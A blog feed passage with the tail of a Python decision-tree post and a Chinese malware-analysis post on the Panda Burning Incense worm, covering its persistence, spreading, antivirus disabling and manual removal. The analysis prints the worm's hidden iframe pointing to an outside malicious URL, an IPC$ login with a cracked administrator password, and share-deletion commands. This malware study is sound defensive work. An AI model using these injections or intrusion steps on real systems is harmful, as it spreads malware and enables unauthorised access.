class="built_in">set</span>(mincol):</span><br><span class="line">                gini = Gini(y[mincol==d])  <span class="comment"># 计算基尼指数</span></span><br><span class="line">                <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                    y_label = Counter(y[mincol==d])</span><br><span class="line">                    y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                    <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                        <span class="keyword">if</span> values == y_num:</span><br><span class="line">                            newtree[d] = key</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                    newtree[d] = self._genTree(cols.copy(), x[mincol==d, :], y[mincol==d])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gini = Gini(y[mincol==st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol==st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[st] = self._genTree(cols.copy(), x[mincol==st, :], y[mincol==st])</span><br><span class="line"></span><br><span class="line">            gini = Gini(y[mincol!=st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol!=st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[<span class="string">&#x27;非&#x27;</span>+st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[<span class="string">&#x27;非&#x27;</span>+st] = self._genTree(cols.copy(), x[mincol!=st, :], y[mincol!=st])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;imin: newtree&#125;<span class="comment">#将列号作为索引，返回新生成的树</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#预测新样本</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = x.tolist()</span><br><span class="line">        y = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            predictDict = self.tree</span><br><span class="line">            <span class="keyword">while</span> predictDict != <span class="string">&#x27;是&#x27;</span> <span class="keyword">and</span> predictDict != <span class="string">&#x27;否&#x27;</span>:</span><br><span class="line">                col = <span class="built_in">list</span>(predictDict.keys())[<span class="number">0</span>]</span><br><span class="line">                predictDict = predictDict[col]</span><br><span class="line">                <span class="keyword">if</span> x[i][col] <span class="keyword">not</span> <span class="keyword">in</span> predictDict.keys():</span><br><span class="line">                    predictDict = predictDict[<span class="string">&#x27;非&#x27;</span>+self.lst[j]]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    predictDict = predictDict[x[i][col]]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y[i] = predictDict</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x, y, signal = CreateData()</span><br><span class="line">    x = DataProcessing(x, signal)</span><br><span class="line">    dt = DecisionTree()</span><br><span class="line">    dt.fit(x, y)</span><br><span class="line">    <span class="built_in">print</span>(dt.tree)</span><br><span class="line">    <span class="built_in">print</span>(dt.predict(x))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香病毒的行为机理分析</title>
    <link href="http://example.com/posts/a48809a5.html"/>
    <id>http://example.com/posts/a48809a5.html</id>
    <published>2022-05-28T06:59:44.232Z</published>
    <updated>2022-06-30T06:04:36.015Z</updated>
    
    <content type="html"><![CDATA[<p>熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 <a href="https://v5le0n9.github.io/posts/adc1352a.html">Windows PE病毒分类及感染方式</a> 。</p><p>熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。</p><span id="more"></span><h1 id="1-熊猫烧香的前因后果"><a href="#1-熊猫烧香的前因后果" class="headerlink" title="1. 熊猫烧香的前因后果"></a>1. 熊猫烧香的前因后果</h1><p>熊猫烧香(Worm.WhBoy)是一款拥有自动传播、自动感染硬盘能力和强大的破坏能力的病毒，它不但不能感染系统中的EXE、COM、PIF、SRC、HTML、ASP等文件，还能中止大量的反病毒软件进程，并且会删除扩展名为gho的文件，是系统备份工具GHOST的备份文件。被感染的用户系统中所有EXE文件的图标全部被改成熊猫烧香。</p><p>2006年10月16日由25岁的湖北武汉李俊编写，2007年1月初肆虐网络，主要通过下载的文件传染传播。</p><p>熊猫烧香的破坏力远大于其技术含量，尤其是对网络信息安全产生深远的影响，毕竟它是第一个让中国普通用户对木马病毒有所认识和感知的。从现在的技术角度看，熊猫烧香病毒技术水平一般，但病毒作者在当时运用的各类技术手法还是值得参考和借鉴的。</p><ul><li>首先它可以感染EXE文件，也可以将扩展名为gho的文件删除</li><li>其次是将源病毒感染到Web文件，使网页成为它传播的介质</li><li>然后在传播层面，病毒作者使用众多传播途径</li><li>最后是具备一定的对抗杀软能力</li></ul><p>熊猫病毒如果是放在现在，这些基本都是所有病毒木马常见、必备的技术，但技术不可同日而语。随着人工智能、大数据、云计算、区块链等先进技术不断发展，病毒作者也将这些技术手段运用到各类安全攻击中危害用户。典型的包括：</p><ul><li>勒索病毒：在2017年5月12日，一款名为WannaCry勒索病毒通过MS17-010漏洞在全球范围大爆发，感染了大量计算机。此后，Petya、Bad Rabbit、Globelmposter等勒索病毒相继对企业及机构发起攻击。</li><li>挖矿木马：伴随着比特币等虚拟数字货币交易火爆的同时，越来越多的人利用数字虚拟币交易大发横财，吸引大量黑产从业人员进入挖矿产业，这也是为什么2017年之后披露的挖矿木马攻击事件数量呈现出爆发式的增长。</li><li>APT攻击：当前鱼叉攻击、水坑攻击、远程可执行漏洞和密码爆破攻击等手段依然是APT攻击的最主要方式。未来，Fileless攻击、将通信的C&amp;C服务器存放在公开的社交网站上、使用公开或者开源工具、多平台攻击和跨平台攻击将成APT攻击技术的主要发展趋势。</li><li>IoT攻击：黑客通常通过设备弱口令或者远程命令执行漏洞对IoT设备进行攻击，攻击者通过蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络，IoT设备成为了黑客最新热爱的武器。</li></ul><p>除此之外，供应链攻击、AI对抗样本、视频语音欺骗等攻击延伸都是未来黑客技术的发展趋势，这些都应该引起我们足够的重视。</p><h1 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2. 样本行为分析"></a>2. 样本行为分析</h1><p>熊猫烧香有它的特殊性，也有它的通用性。</p><h2 id="2-1-自启动方式"><a href="#2-1-自启动方式" class="headerlink" title="2.1 自启动方式"></a>2.1 自启动方式</h2><ul><li><p>熊猫烧香病毒将自身拷贝至系统目录，同时修改注册表将自身设置为开机启动项。</p><p>这种方式也是绝大部分病毒自启动所采用的方式。</p></li><li><p>拷贝自身到所有驱动器根目录(盘符)，命名为<code>setup.exe</code>，在驱动器根目录生成<code>autorun.inf</code>文件，并把它设置为隐藏、只读、系统。</p><p><code>autorun.inf</code>文件的作用是允许在双击磁盘时自动运行指定的某个文件，即运行<code>setup.exe</code>。</p></li></ul><p>注意，该<code>setup.exe</code>文件被设置为隐藏、只读、系统，虽然我们可以查看“隐藏的项目”，但某些隐藏的系统文件仍然是看不到的。</p><img src="/posts/a48809a5/2.1.1.png" class="" title="隐藏的项目"><p>我们需要进一步设置，取消勾选“隐藏保护的操作系统文件”，才能显示这类文件，如下图所示。而通常设置为隐藏的系统文件是较难被觉察的，尤其当这类文件被写入到某个指定的操作系统目录中，防不胜防。</p><img src="/posts/a48809a5/2.1.2.png" class="" title="隐藏的系统文件"><h2 id="2-2-感染与传播方式"><a href="#2-2-感染与传播方式" class="headerlink" title="2.2 感染与传播方式"></a>2.2 感染与传播方式</h2><ul><li><p>感染可执行文件</p><p>熊猫烧香病毒会搜索并感染系统中特定目录外的所有EXE / SCR / PIF / COM等文件，将自身捆绑在被感染文件前端，并在尾部添加标记信息：<code>.WhBoy&#123;原文件名&#125;.exe.&#123;原文件大小&#125;</code>。注意，它感染的是特定目录外的，而某些系统目录是不去感染的，因为Windows系统某些可执行文件是有还原机制的，系统文件修改有时候会有报警提示。</p></li><li><p>感染网页</p><p>熊猫烧香病毒会查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件，在里面插入网页标记，这个帧iframe会将另外一个URL嵌入到当前网页，并且宽度和高度设置为0（看不到）。嵌入页面后会利用如IE浏览器的漏洞来触发恶意代码，从而释放相应病毒出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.ac86.cn/66/index.htm</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通过弱口令传播</p><p>这种传播方式非常普遍，它会访问局域网共享文件夹将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>（模拟游戏名称）；通过弱口令猜测从而进入系统C盘。</p></li></ul><h2 id="2-3-自我隐藏"><a href="#2-3-自我隐藏" class="headerlink" title="2.3 自我隐藏"></a>2.3 自我隐藏</h2><ul><li><p>禁用安全软件</p><p>熊猫烧香病毒会尝试关闭安全软件（杀毒软件、防火墙、安全工具）的窗口、进程，比如包含360的名称等；删除注册表中安全软件的启动项；禁用安全软件的服务等操作。</p></li><li><p>自动恢复“显示所有文件和文件夹”选项隐藏功能</p><p>某些用户去看隐藏文件，会主动点击查看隐藏文件夹，但这个病毒会自动恢复隐藏。</p></li><li><p>删除系统的隐藏共享（net share）</p><p>Windows系统其实默认会开启隐藏共享 C$ ，比如早期的 IPC$ 管道等，通过net share命令可以删除隐藏共享。</p></li></ul><p>在未经授权的情况下很难将木马拷贝到别人的电脑上，这里需要利用 IPC$ 漏洞，调用445端口号实现。445端口中有个 IPC$  ，称之为空连接，没有固定文件夹的共享；而 C$ 、D$ 、E$ 代表分区共享，是有固定文件夹的。换句话说，445端口打开就相当于我们可以在局域网中轻松访问各种共享文件夹，如果您的电脑是弱密码，很容易就被攻破，这里使用 IPC$ 暴力爆破。</p><p>IPC$ (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$ 是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。NT2000在提供了 IPC$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$ 、D$ 、E$、…)和系统目录(C:\windows)共享。所有的这些初衷都是为了方便管理员的管理，但好的初衷并不一定有好的收效，一些别有用心者会利用IPC$访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。</p><p>下图展示了使用NTscan软件暴力爆破，该软件支持远程连接 IPC$ 和利用字典文件。运行软件，输入IP地址“10.1.1.2”，选择IPCscan连接共享“IPC$”，成功获取了密码“123.com”。</p><img src="/posts/a48809a5/2.3.1.png" class="" title="NTScan暴力破解"><p>接着与目标主机建立 IPC$ 空连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.1.2\ipc$ 123.com /user:administrator</span><br></pre></td></tr></table></figure><h2 id="2-4-破坏功能"><a href="#2-4-破坏功能" class="headerlink" title="2.4 破坏功能"></a>2.4 破坏功能</h2><ul><li><p>熊猫烧香病毒同时会开另一个线程连接某网站下载DDOS程序进行发动恶意攻击</p><p>具有破坏功能，可开启附件攻击行为，熊猫烧香感染计算机台数非常多，它就能发动多台电脑发起DDOS攻击。</p></li><li><p>删除扩展名为gho的文件，延长存活时间</p><p>该文件是系统备份工具GHOST的备份文件，从而使用户的系统备份文件丢失。当用户中了病毒，想去恢复时就存在困难了。</p></li></ul><p>这就是一个典型的病毒案例，现在很多病毒功能都具有相似性，它们有经济利益趋势。当然对于不同的病毒来说，如果它们的目的不一样，其行为会存在很大差异。熊猫烧香病毒的隐蔽性不是很好，每一个感染者都会知道自己已被感染。</p><h1 id="3-样本运行及查杀防御"><a href="#3-样本运行及查杀防御" class="headerlink" title="3. 样本运行及查杀防御"></a>3. 样本运行及查杀防御</h1><p>手动查杀病毒基本流程如下：</p><ul><li><p>排查可疑进程</p><p>因为病毒往往会创建出来一个或者多个进程，因此需要分辨出哪些进程是由病毒所创建，然后删除可疑进程。</p></li><li><p>检查启动项</p><p>病毒为了实现自启动，会采用一些方法将自己添加到启动项中，从而实现自启动，所以我们需要把启动项中的病毒清除。</p></li><li><p>删除病毒</p><p>在上一步的检查启动项中，我们就能够确定病毒主体的位置，这样就可以顺藤摸瓜，从根本上删除病毒文件。</p></li><li><p>修复被病毒破坏的文件</p><p>这一步一般来说无法直接通过纯手工完成，需利用相应的软件，不是我们讨论的重点。</p></li></ul><p>为什么计算机中安装了杀毒软件，还要去手动查杀呢？</p><p>因为杀毒软件存在严重的滞后性，必须要等病毒工程师抓取对应样本，并进行分析总结病毒的特征码，再加入杀软病毒库后才能识别病毒，但病毒会存在各种变种，因此手动查杀也是必要的。同时，这对反病毒工程师来说也是认识和熟悉病毒的过程，在技术上是非常必要的。这也是现在为什么很多云沙箱、云杀软、动态更新的技术不断出现。</p><h2 id="3-1-排查可疑进程"><a href="#3-1-排查可疑进程" class="headerlink" title="3.1 排查可疑进程"></a>3.1 排查可疑进程</h2><p>运行病毒前打开任务管理器观察此时打开的进程。</p><img src="/posts/a48809a5/3.1.1.png" class="" title="当前任务管理器进程"><img src="/posts/a48809a5/3.1.2.png" class="" title="当前任务管理器进程"><p>运行熊猫烧香样本，可以发现任务管理器就自动关闭，并且无法再次打开（总一闪而过）。那么，我们怎么查看系统中的进程呢？打开CMD命令提示符，输入命令“tasklist”查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [版本 6.1.7601]</span><br><span class="line">版权所有 (c) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Leong&gt;tasklist</span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话#       内存使用</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0        612 K</span><br><span class="line">smss.exe                       244 Services                   0        796 K</span><br><span class="line">csrss.exe                      332 Services                   0      4,228 K</span><br><span class="line">csrss.exe                      384 Console                    1     19,856 K</span><br><span class="line">wininit.exe                    392 Services                   0      3,904 K</span><br><span class="line">winlogon.exe                   428 Console                    1      5,748 K</span><br><span class="line">services.exe                   488 Services                   0      7,028 K</span><br><span class="line">lsass.exe                      496 Services                   0      7,744 K</span><br><span class="line">lsm.exe                        512 Services                   0      4,508 K</span><br><span class="line">svchost.exe                    596 Services                   0      7,060 K</span><br><span class="line">svchost.exe                    672 Services                   0      6,208 K</span><br><span class="line">svchost.exe                    764 Services                   0     13,072 K</span><br><span class="line">svchost.exe                    808 Services                   0      8,620 K</span><br><span class="line">svchost.exe                    840 Services                   0     26,444 K</span><br><span class="line">svchost.exe                    980 Services                   0     10,328 K</span><br><span class="line">svchost.exe                   1048 Services                   0     12,412 K</span><br><span class="line">spoolsv.exe                   1200 Services                   0      8,544 K</span><br><span class="line">svchost.exe                   1228 Services                   0     10,708 K</span><br><span class="line">httpd.exe                     1332 Services                   0     17,104 K</span><br><span class="line">VGAuthService.exe             1444 Services                   0      7,248 K</span><br><span class="line">taskhost.exe                  1548 Console                    1      7,620 K</span><br><span class="line">dwm.exe                       1604 Console                    1     58,972 K</span><br><span class="line">explorer.exe                  1612 Console                    1     57,228 K</span><br><span class="line">httpd.exe                     1740 Services                   0     17,272 K</span><br><span class="line">vmtoolsd.exe                  1792 Services                   0     15,804 K</span><br><span class="line">svchost.exe                   1432 Services                   0      4,768 K</span><br><span class="line">vm3dservice.exe               1496 Console                    1      3,664 K</span><br><span class="line">vmtoolsd.exe                  1480 Console                    1     20,996 K</span><br><span class="line">jusched.exe                   2140 Console                    1      4,040 K</span><br><span class="line">ApacheMonitor.exe             2224 Console                    1      3,584 K</span><br><span class="line">dllhost.exe                   2244 Services                   0      8,788 K</span><br><span class="line">msdtc.exe                     2408 Services                   0      6,272 K</span><br><span class="line">WmiPrvSE.exe                  2660 Services                   0     11,264 K</span><br><span class="line">SearchIndexer.exe             2692 Services                   0     34,036 K</span><br><span class="line">svchost.exe                   3296 Services                   0      3,712 K</span><br><span class="line">sppsvc.exe                    3332 Services                   0      7,360 K</span><br><span class="line">svchost.exe                   3368 Services                   0      6,296 K</span><br><span class="line">audiodg.exe                   2384 Services                   0     14,140 K</span><br><span class="line">SearchProtocolHost.exe        3744 Services                   0      6,240 K</span><br><span class="line">SearchFilterHost.exe          4084 Services                   0      4,204 K</span><br><span class="line">spoclsv.exe                   2268 Console                    1      5,960 K</span><br><span class="line">cmd.exe                       3252 Console                    1      2,640 K</span><br><span class="line">conhost.exe                   2348 Console                    1      6,880 K</span><br><span class="line">tasklist.exe                  2968 Console                    1      4,492 K</span><br></pre></td></tr></table></figure><p>重点关注会话值为1的进程，发现<code>spoclsv.exe</code>、<code>cmd.exe</code>、<code>conhost.exe</code>、<code>tasklist.exe</code>都没出现过。<code>cmd.exe</code>和<code>tasklist.exe</code>都是我们操作过的命令，可以不管。百度<code>conhost.exe</code>是命令行程序的宿主进程，非病毒木马；<code>spoclsv.exe</code>是熊猫烧香病毒相关程序。</p><p>输入以下命令强制结束进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im 2268#强制结束PID为2268的进程</span><br></pre></td></tr></table></figure><p>其中“/f”表示强制执行，“/im”表示文件镜像，“2268”对应PID值。注意，使用普通用户执行命令不能结束该进程，需使用管理员权限。</p><img src="/posts/a48809a5/3.1.3.png" class="" title="终止spoclsv.exe"><p>此时，任务管理器又可以打开了。</p><h2 id="3-2-检查启动项"><a href="#3-2-检查启动项" class="headerlink" title="3.2 检查启动项"></a>3.2 检查启动项</h2><p>排查可疑进程之后，接下来查询启动项，徽标键 + R -&gt; 输入msconfig。显示如下图所示，可以看到“svcshare”启动项。命令为<code>C:\WINDOWS\System32\drivers\spoclsv.exe</code>，位置在<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>。</p><img src="/posts/a48809a5/3.2.1.png" class="" title="样本启动项"><p>徽标键 + R -&gt; 输入regedit，打开注册表。在注册表搜索“svcshare”找到了它，也就是说这个病毒也会写进注册表里，启动对应的EXE程序。</p><img src="/posts/a48809a5/3.2.2.png" class="" title="写入注册表"><p>先将病毒的启动项取消，回到系统配置中取消勾选“svcshare”启动项，暂不重新启动计算机。</p><img src="/posts/a48809a5/3.2.4.png" class="" title="写入注册表"><p>回到注册表中看，病毒写入注册表的信息已经消失了，说明启动项已经成功被删除。</p><img src="/posts/a48809a5/3.2.5.png" class="" title="写入注册表"><h2 id="3-3-删除病毒"><a href="#3-3-删除病毒" class="headerlink" title="3.3 删除病毒"></a>3.3 删除病毒</h2><p>对于病毒程序，我们要使用强制删除。同样，用管理员权限打开命令窗口，进入到病毒所在目录，执行以下命令强制删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del /f spoclsv.exe</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/3.3.1.png" class="" title="强制删除病毒"><p>但这还没有结束，该病毒还将自身复制到每一个磁盘的根目录下。在C盘根目录下查看隐藏、只读、系统文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /ah</span><br></pre></td></tr></table></figure><p>根据样本行为分析中的自启动方式看，<code>autorun.inf</code>和<code>setup.exe</code>都是这个病毒带过来的。所以要将它们强制删除。</p><img src="/posts/a48809a5/3.3.2.png" class="" title="强制删除病毒"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del /ah /f antorun.inf</span><br><span class="line">del /ah /f setup.exe</span><br></pre></td></tr></table></figure><p>注意，是每一个磁盘都要删除<code>autorun.inf</code>和<code>setup.exe</code>。</p><img src="/posts/a48809a5/3.3.3.png" class="" title="强制删除病毒"><p>重启系统后，所有手动查杀病毒的工作完毕，我们的系统就又恢复正常了。</p><h1 id="4-Procmon检测病毒行为"><a href="#4-Procmon检测病毒行为" class="headerlink" title="4. Procmon检测病毒行为"></a>4. Procmon检测病毒行为</h1><h2 id="4-1-软件介绍"><a href="#4-1-软件介绍" class="headerlink" title="4.1 软件介绍"></a>4.1 软件介绍</h2><p>Process Monitor是微软推荐的一款系统监视工具，能够实时显示文件系统、注册表（读写）、网络连接与进程活动的高级工具。它整合了旧的Sysinternals工具、Filemon与Regmon，其中Filemon专门用来监视系统中的任何文件操作过程，Regmon用来监视注册表的读写操作过程。同时，Process Monitor增加了进程ID、用户、进程可靠度等监视项，可以记录到文件中。</p><p>总的来说，Process Monitor可以帮助使用者对系统中的任何文件、注册表操作进行监视和记录，通过注册表和文件读写的变化，有效帮助诊断系统故障或发现恶意软件、病毒及木马。</p><img src="/posts/a48809a5/4.1.1.png" class="" title="Procmon界面"><h2 id="4-2-病毒行为检测"><a href="#4-2-病毒行为检测" class="headerlink" title="4.2 病毒行为检测"></a>4.2 病毒行为检测</h2><p>打开Procmon，Filter -&gt; Filter(快捷键Ctrl + L)，添加过滤病毒名称<code>setup.exe</code>。</p><img src="/posts/a48809a5/4.2.1.png" class="" title="添加过滤病毒"><p>运行熊猫烧香<code>setup.exe</code>，可以看到Procmon捕获了非常多的病毒信息。</p><img src="/posts/a48809a5/4.2.2.png" class="" title="捕获病毒行为"><p>Tools -&gt; Process Tree(快捷键Ctrl + T)，查看病毒的进程树。</p><img src="/posts/a48809a5/4.2.3.png" class="" title="查看病毒进程树"><p>可以看到<code>setup.exe</code>的熊猫烧香病毒程序，并衍生出一个<code>spoclsv.exe</code>程序。位置信息为：<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>。</p><p>发现<code>spoclsv.exe</code>程序两次打开cmd，运行“net share”命令删除各个磁盘共享及系统根目录共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share C$ /del /y#删除C盘下的默认共享</span><br><span class="line">net share admin$ /del /y#删除C:\WINDOWS远程管理</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/4.2.4.png" class="" title="删除磁盘共享和根目录共享"><p>回到Procmon继续深入分析，关闭其它结果，只剩下注册表行为。</p><img src="/posts/a48809a5/4.2.5.png" class="" title="只显示注册表行为"><p>接着在过滤器中仅筛选对注册表修改的值，如下图所示。</p><img src="/posts/a48809a5/4.2.6.png" class="" title="筛选对注册表的修改"><img src="/posts/a48809a5/4.2.7.png" class="" title="筛选对注册表的修改"><p>主要修改的是Seed项，就是随机数种子的生成。但仅仅通过这个信息无法推测注册表的行为，所以该病毒对注册表并没有造成什么实质性影响。</p><p>在过滤器中删除注册表的修改，然后检测熊猫烧香病毒是否创建文件，创建文件也是病毒的重要手段。</p><img src="/posts/a48809a5/4.2.8.png" class="" title="筛选创建文件"><p>可以看到主要创建的文件是<code>C:\WINDOWS\system32\drivers</code>目录下，其它并没有特别的东西。所以<code>setup.exe</code>程序对我们的系统并没有实质性影响，主要影响还是<code>spoclsv.exe</code>程序，所以下一步操作就是监控<code>spoclsv.exe</code>程序。</p><img src="/posts/a48809a5/4.2.9.png" class="" title="监控spoclsv.exe"><p>重置过滤器，设置对<code>spoclsv.exe</code>程序的监控。在过滤器中查看<code>spoclsv.exe</code>删除注册表选项。</p><img src="/posts/a48809a5/4.2.10.png" class="" title="筛选删除注册表"><img src="/posts/a48809a5/4.2.11.png" class="" title="筛选删除注册表"><p>从这些名称可以看出它们都是常用的杀毒软件名称，其位置是CurrentVersion的Run下面，也就是将杀毒软件的自启动项全部删除。</p><p>在过滤器中查看<code>spoclsv.exe</code>创建及设置的注册表键值。</p><img src="/posts/a48809a5/4.2.12.png" class=""><p>显示结果如下图所示，病毒设置了自启动项，要启动的本体是drivers目录下的<code>spoclsv.exe</code>。继续查看，发现它对文件实现隐藏，设置该值后，即使我们在文件夹选项中选择显示所有文件和文件夹，也无法显示隐藏文件。</p><img src="/posts/a48809a5/4.2.13.png" class="" title="设置自启动项和实现文件隐藏"><p>只显示<code>spoclsv.exe</code>的文件系统行为。</p><p>熊猫烧香病毒创建文件包括：</p><ul><li>在<code>C:\WINDOWS\system32\drivers</code>中创建<code>spoclsv.exe</code></li><li>磁盘根目录创建<code>setup.exe</code>与<code>autorun.inf</code></li><li>某些目录中创建<code>Desktop_.ini</code>文件</li></ul><img src="/posts/a48809a5/4.2.14.png" class="" title="监控文件系统行为"><p>由于创建这些文件之后就对注册表的SHOWALL项进行了设置，使得隐藏文件无法显示，那么有理由相信，所创建出来的这些文件的属性都是“隐藏”的。</p><p>查看<code>spoclsv.exe</code>的网络行为。从监控结果可以看到，病毒会向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包。</p><img src="/posts/a48809a5/4.2.14.png" class="" title="监控网络行为"><p>综上所述，可以总结熊猫烧香的几个行为：</p><ol><li>在<code>C:\WINDOWS\system32\drivers</code>目录创建<code>spoclsv.exe</code>程序</li><li>命令行模式下使用“net 